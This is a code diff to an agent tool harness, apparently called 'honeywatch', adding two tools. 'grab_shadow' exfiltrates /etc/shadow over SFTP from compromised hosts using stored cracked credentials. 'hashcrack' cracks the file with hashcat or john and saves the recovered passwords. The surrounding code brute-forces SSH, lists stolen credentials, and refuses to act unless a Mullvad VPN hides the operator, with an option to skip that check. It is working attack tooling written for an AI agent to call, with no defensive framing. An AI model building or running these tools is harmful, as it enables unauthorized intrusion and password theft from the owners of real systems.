@@ -73,9 +73,8 @@ def _require_vpn(ctx: ToolContext) -> bool:
     if not required:
         return True
     timeout = getattr(vpn_cfg, "timeout_s", DEFAULT_TIMEOUT) if vpn_cfg else DEFAULT_TIMEOUT
-    ok, detail = require_mullvad(timeout=timeout, quiet=True)
-    if ok:
-        print(f"honeywatch: vpn gate OK ({detail})", file=sys.stderr)
+    # require_mullvad always returns a plain bool (quiet only mutes logging).
+    if require_mullvad(timeout=timeout, quiet=True):
         return True
     print(
         "honeywatch: REFUSED - Mullvad VPN is not connected. "
@@ -349,6 +348,39 @@ _TOOL_SPECS: list[dict[str, Any]] = [
                 "user": {"type": "string"},
                 "limit": {"type": "integer"},
             },
+        },
+    },
+    {
+        "name": "grab_shadow",
+        "description": "SFTP-exfil /etc/shadow from a popped host using cracked creds (auto-fills from the store).",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "host": {"type": "string", "description": "ip[:port] to exfil from."},
+                "user": {"type": "string"},
+                "pass": {"type": "string"},
+                "key": {"type": "string"},
+                "stash": {"type": "string"},
+                "skip_vpn_check": {"type": "boolean"},
+            },
+            "required": ["host"],
+        },
+    },
+    {
+        "name": "hashcrack",
+        "description": "Offline-crack an /etc/shadow file with hashcat or john, persisting recovered passwords to the store.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "shadow": {"type": "string", "description": "path to /etc/shadow or a stash dir from grab_shadow."},
+                "wordlist": {"type": "string"},
+                "tool": {"type": "string", "description": "hashcat or john (default hashcat)."},
+                "mode": {"type": "integer"},
+                "ip": {"type": "string", "description": "record creds against this host in the store."},
+                "port": {"type": "integer"},
+                "no_save": {"type": "boolean"},
+            },
+            "required": ["shadow", "wordlist"],
         },
     },
 ]
@@ -724,6 +756,74 @@ def _tool_list_credentials(args: dict[str, Any], ctx: ToolContext) -> dict[str, 
     return {"count": len(rows), "credentials": rows}
 
 
+def _tool_grab_shadow(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
+    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
+    if not skip and not _require_vpn(ctx):
+        return {"error": "VPN gate blocked the grab. Connect Mullvad or pass skip_vpn_check=true."}
+
+    from honeywatch.cli import parse_host
+    from honeywatch.hashcrack import grab_shadow
+
+    ip, port = parse_host(args["host"])
+    user = args.get("user")
+    passw = args.get("pass")
+    if (not user or not passw) and not args.get("key"):
+        cred = ctx.store.credential_for(ip, port)
+        if cred:
+            user = user or cred.get("user")
+            passw = passw or cred.get("password")
+    res = grab_shadow(
+        ip=ip, port=port, user=user, password=passw, key_path=args.get("key"),
+        stash_dir=args.get("stash", ".honeywatch/shadow_stash"),
+        timeout_s=10.0,
+    )
+    return res
+
+
+def _tool_hashcrack(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
+    import os
+    from honeywatch.hashcrack import crack_shadow
+
+    shadow_path = args["shadow"]
+    if os.path.isdir(shadow_path):
+        sub = os.path.join(shadow_path, "shadow")
+        if os.path.isfile(sub):
+            shadow_path = sub
+    if not os.path.isfile(shadow_path):
+        return {"error": "shadow file not found: " + args["shadow"]}
+
+    tool = args.get("tool", "hashcat")
+    mode = args.get("mode")
+    if mode is not None:
+        mode = int(mode)
+    result = crack_shadow(
+        shadow_path=shadow_path,
+        wordlist=args["wordlist"],
+        tool=tool,
+        mode=mode,
+        timeout_s=args.get("timeout"),
+    )
+    creds = result.credentials()
+    if creds and not bool(args.get("no_save", False)):
+        ip = args.get("ip") or ""
+        port = int(args.get("port", 22))
+        for c in creds:
+            if ip:
+                ctx.store.upsert_credential(
+                    ip, port, c["user"], c["password"],
+                    banner=None, attempts=1,
+                    source="hashcat" if tool == "hashcat" else "john",
+                )
+    return {
+        "tool": result.tool,
+        "attempted": result.attempted,
+        "cracked": len(creds),
+        "error": result.error,
+        "returncode": result.returncode,
+        "credentials": creds,
+    }
+
+
 def _summarize_scores(scores: list[Score]) -> dict[str, int]:
     from collections import Counter
 
@@ -763,6 +863,8 @@ _tool("set_wallet", _tool_set_wallet)
 _tool("set_ollama", _tool_set_ollama)
 _tool("crack_ssh", _tool_crack_ssh)
 _tool("list_credentials", _tool_list_credentials)
+_tool("grab_shadow", _tool_grab_shadow)
+_tool("hashcrack", _tool_hashcrack)
 
 
 def execute_tool(name: str, args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
